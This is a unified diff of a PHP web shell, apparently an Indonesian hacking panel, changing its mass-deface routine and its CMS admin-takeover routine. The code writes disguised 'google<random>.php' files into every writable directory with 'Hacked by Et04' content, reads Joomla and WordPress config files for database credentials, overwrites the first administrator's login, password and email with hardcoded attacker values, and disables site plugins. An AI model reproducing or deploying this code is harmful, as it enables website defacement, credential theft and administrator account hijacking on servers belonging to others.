@@ -310,7 +310,6 @@ echo "<li>[ <a href='?dir=$dir&do=sym'>Symlink</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=sym404'>Sym404</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=cpanel'>Cpanel Crack</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=root'>Simple Root</a> ]</li>";
-echo "<li>[ <a href='?dir=$dir&do=targz'>Extract tar.gz</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=delete'>Delete Empty Dir</a> ]</li></br>";
 echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
@@ -326,6 +325,7 @@ echo "<hr color='dodgerblue'>";
 if($_POST['do_cmd']) {
     echo "<pre>".exe($_POST['cmd'])."</pre>"; 
 } elseif($_GET['do'] == 'mass_deface') {
+  $random = substr(str_shuffle(md5(__FILE__)),0,16);
   function sabun_massal($dir,$namafile,$isi_script) {
     if(is_writable($dir)) {
       $dira = scandir($dir);
@@ -348,10 +348,11 @@ if($_POST['do_cmd']) {
       }
     }
   }
-  function sabun_biasa($dir,$namafile,$isi_script) {
+  function sabun_biasa($dir,$isi_script) {
     if(is_writable($dir)) {
       $dira = scandir($dir);
       foreach($dira as $dirb) {
+        $namafile = "google".substr(str_shuffle(md5(date(dmy))),0,16).".php";
         $dirc = "$dir/$dirb";
         $lokasi = $dirc.'/'.$namafile;
         if($dirb === '.') {
@@ -361,8 +362,8 @@ if($_POST['do_cmd']) {
         } else {
           if(is_dir($dirc)) {
             if(is_writable($dirc)) {
-              echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
-              file_put_contents($lokasi, $isi_script);
+              echo "[<font color=lime>DONE</font>]<br>$dirb/$namafile<br><br>";
+              file_put_contents($lokasi,$isi_script);
             }
           }
         }
@@ -404,7 +405,7 @@ if($_POST['do_cmd']) {
       echo "</div>";
     } elseif($_POST['tipe_sabun'] == 'murah') {
       echo "<div style='margin: 5px auto; padding: 5px'>";
-      sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+      sabun_biasa($_POST['d_dir'], $_POST['script']);
       echo "</div>";
     } elseif($_POST['tipe_sabun'] == 'hapus') {
       echo "<div style='margin: 5px auto; padding: 5px'>";
@@ -419,7 +420,7 @@ if($_POST['do_cmd']) {
   <font style='text-decoration: underline;'>Folder:</font><br>
   <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
   <font style='text-decoration: underline;'>Filename:</font><br>
-  <input type='text' name='d_file' value='".date("mdyhi").".php' style='width: 450px;' height='10'><br>
+  <input type='text' name='d_file' value='google".substr(str_shuffle(md5(date(dmy))),0,16).".php' style='width: 450px;' height='10'><br>
   <font style='text-decoration: underline;'>Index File:</font><br>
   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Et04</textarea><br>
   <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
@@ -876,8 +877,9 @@ unlink("azzatssins.c");unlink("azzatssins");
           $dbpass = ambilkata($config,"password = '","'");
           $dbname = ambilkata($config,"db = '","'");
           $dbprefix = ambilkata($config,"dbprefix = '","'");
-          $pathlogs = ambilkata($config,"var \$log_path = '","'");
-          $pathlog = ambilkata($config,"public \$log_path = '","'");
+          $pathlog = ambilkata($config,"\$log_path = '","'");
+          $sitenem = ambilkata($config,"\$sitename = '","'");
+          $mailfrom = ambilkata($config,"\$mailfrom = '","'");
           $prefix = $dbprefix."users";
           $conn = mysql_connect($dbhost,$dbuser,$dbpass);
           $db = mysql_select_db($dbname);
@@ -889,8 +891,9 @@ unlink("azzatssins.c");unlink("azzatssins");
           if(!$update OR !$conn OR !$db) {
             
           } else {
-            echo "Config => ".$file_conf."<br>";
-            echo "Path Log => ".$pathlog.$pathlogs."<br>";
+            echo "Site Name => ".$sitenem."<br>";
+            echo "Mail From => ".$mailfrom."<br>";
+            echo "Path Log => ".$pathlog."<br>";
             echo "CMS => Joomla<br>";
             echo "Status => <font color=lime>sukses edit user, silakan login dengan user, pass & email yang baru.</font><br><br>";
           }
@@ -921,8 +924,10 @@ unlink("azzatssins.c");unlink("azzatssins");
           $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru',user_email='$email_baru' WHERE id='$id'");
           $bypass = mysql_query("UPDATE $option SET option_value='' WHERE option_name='active_plugins'");
           
-          if(!$update OR !$conn OR !$db OR !$bypass) {
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
           }
           mysql_close($conn);
         } elseif(preg_match("/Magento|Mage_Core/",$config)) {
@@ -1080,49 +1085,15 @@ unlink("azzatssins.c");unlink("azzatssins");
     $email = "suryanata.go.id@gmail.com";
     foreach($link as $dir_config) {
       $config = anucurl($dir_config);
-      if(preg_match("/WordPress/",$config)) {
-      $dbhost = ambilkata($config,"DB_HOST', '","'");
-      $dbuser = ambilkata($config,"DB_USER', '","'");
-      $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
-      $dbname = ambilkata($config,"DB_NAME', '","'");
-      $dbprefix = ambilkata($config,"table_prefix  = '","'");
-      $prefix = $dbprefix."users";
-      $option = $dbprefix."options";
-      $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-      $db = mysql_select_db($dbname);
-      $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
-      $result = mysql_fetch_array($q);
-      $id = $result[ID];
-      $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
-      $result2 = mysql_fetch_array($q2);
-      $target = $result2[option_value];
-      if($target == '') {         
-        echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
-      } else {
-        echo "[+] $target <br>";
-      }
-      $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx',user_email='$email' WHERE ID='$id'");
-      $bypass = mysql_query("UPDATE $option SET option_value='' WHERE option_name='active_plugins'");
-
-      if(!$conn OR !$db OR !$update) {
-        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
-        mysql_close($conn);
-      } else {
-                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
-                    echo "[+] username: <font color=lime>$user</font><br>";
-                    echo "[+] password: <font color=lime>$pass</font><br>";     
-                    echo "[+] email: <font color=lime>$email</font><br><br>";     
-                    }
-              mysql_close($conn);
-      }
-    }
-    } elseif(preg_match("/JConfig|joomla/",$config)) {
-          $config = anucurl($dir_config);
+        if(preg_match("/JConfig|joomla/",$config)) {
           $dbhost = ambilkata($config,"host = '","'");
           $dbuser = ambilkata($config,"\$user = '","'");
           $dbpass = ambilkata($config,"password = '","'");
           $dbname = ambilkata($config,"db = '","'");
           $dbprefix = ambilkata($config,"dbprefix = '","'");
+          $pathlog = ambilkata($config,"\$log_path = '","'");
+          $sitenem = ambilkata($config,"\$sitename = '","'");
+          $mailfrom = ambilkata($config,"\$mailfrom = '","'");
           $prefix = $dbprefix."users";
           $conn = mysql_connect($dbhost,$dbuser,$dbpass);
           $db = mysql_select_db($dbname);
@@ -1130,21 +1101,52 @@ unlink("azzatssins.c");unlink("azzatssins");
           $result = mysql_fetch_array($q);
           $id = $result['id'];
           $site = ambilkata($config,"sitename = '","'");
-          $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx',email='$email' WHERE id='$id'");
-          if($site == '') {
-            echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
+          $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
+          if(!$update OR !$conn OR !$db) {
+            
           } else {
-            echo "[+] $site<br>";
+            echo "Site Name => ".$sitenem."<br>";
+            echo "Mail From => ".$mailfrom."<br>";
+            echo "Path Log => ".$pathlog."<br>";
+            echo "CMS => Joomla<br>";
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user, pass & email yang baru.</font><br><br>";
           }
-      if(!$conn OR !$db OR !$update) {
-        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
-        mysql_close($conn);
-      } else {
-                    echo "[+] username: <font color=lime>$user</font><br>";
-                    echo "[+] password: <font color=lime>$email</font><br>";     
-                    echo "[+] email: <font color=lime>$pass</font><br><br>";     
-                    }
-              mysql_close($conn);
+          mysql_close($conn);   
+          } elseif(preg_match("/WordPress/",$config)) {
+          $dbhost = ambilkata($config,"DB_HOST', '","'");
+          $dbuser = ambilkata($config,"DB_USER', '","'");
+          $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+          $dbname = ambilkata($config,"DB_NAME', '","'");
+          $dbprefix = ambilkata($config,"table_prefix  = '","'");
+          $prefix = $dbprefix."users";
+          $option = $dbprefix."options";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+          $result = mysql_fetch_array($q);
+          $id = $result[ID];
+          $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+          $result2 = mysql_fetch_array($q2);
+          $target = $result2[option_value];
+          if($target == '') {
+            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+          } else {
+            $url = validUrl("$target/wp-login.php");
+            echo "<a href='$url' target='_blank'>$url</a> <font color=red>=></font> <font color=aqua>$file_conf</font><br />";
+
+          }
+          $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx',user_email='$email' WHERE id='$id'");
+          $bypass = mysql_query("UPDATE $option SET option_value='' WHERE option_name='active_plugins'");
+          
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+
+          mysql_close($conn);
+        }   
+        }
   } else {
     echo "<center>
     <form method='post'>
@@ -1207,7 +1209,7 @@ elseif($zxcase){
   foreach($zxcase as $hrfhrasdzc){
   preg_match_cdzxcfg('#zone "(.*)"#',$hrfhrasdzc,$zxcwetexz);
   flush();
-  if(strlen(trim($hrfhrasdzc[1][0])) >2){
+  if(strlen(trim($zxcwetexz[1][0])) >2){
   $hascewry[] = $zxcwetexz[1][0];
   }
 }
